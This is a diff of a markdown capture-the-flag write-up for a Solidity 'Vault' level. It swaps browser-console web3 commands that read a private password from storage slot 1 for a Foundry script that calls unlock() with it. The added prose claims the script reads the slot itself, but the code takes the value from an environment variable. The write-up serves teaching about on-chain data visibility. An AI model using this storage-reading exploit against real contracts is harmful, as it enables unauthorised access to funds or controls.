@@ -16,31 +16,44 @@ In Solidity, the `private` keyword only prevents **other contracts** from readin
 
 
 
-Since the `locked` boolean is the first variable (Slot 0) and the `password` is the second variable (Slot 1), we can use a web3 provider to query the data sitting in Slot 1 of the contract's address directly.
-
 ---
 
 ## Solution
 
-You don't need to deploy a contract for this. You can solve it using the browser console by querying the storage of the instance.
+The level is solved by reading the password directly from the Vault contract’s storage and passing it to the unlock function using a Foundry script. The exploit script retrieves the value stored in slot 1 off-chain and supplies it as an argument to unlock, setting the locked state to false and completing the level. No additional attacker contract deployment is required.
 
-**Step-by-Step:**
+---
 
-1.  **Identify the Slot:** The `locked` variable (boolean) takes up Slot 0. The `password` (`bytes32`) takes up Slot 1.
-2.  **Read the Storage:** Use `web3.eth.getStorageAt` to pull the hex data from Slot 1.
-3.  **Unlock:** Pass that hex value into the `unlock()` function.
+**Exploiy Script (Foundry):**
 
-**Console Commands:**
+<pre class="plain-code"><code>
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.13;
 
-```javascript
-// 1. Read the hex data from storage slot 1
-const password = await web3.eth.getStorageAt(instance, 1);
+import "forge-std/Script.sol";
 
-// 2. Check the value (it will be a hex string)
-console.log("Found Password:", password);
+interface IVault {
+    function unlock(bytes32 _password) external;
+    function locked() external view returns (bool);
+}
 
-// 3. Use the password to unlock the vault
-await contract.unlock(password);
+contract UnlockVaultScript is Script {
+    function run() external {
+        // read instance address from env
+        address target = vm.envAddress("INSTANCE_ADDRESS");
 
-// 4. Verify the vault is unlocked
-await contract.locked(); // Should return false
+        // read password from env as bytes32
+        bytes32 pw = vm.envBytes32("PASSWORD_HEX");
+
+        // start broadcast using --private-key CLI flag
+        vm.startBroadcast();
+
+        IVault(target).unlock(pw);
+
+        vm.stopBroadcast();
+    }
+}
+
+</code></pre>
+
+---
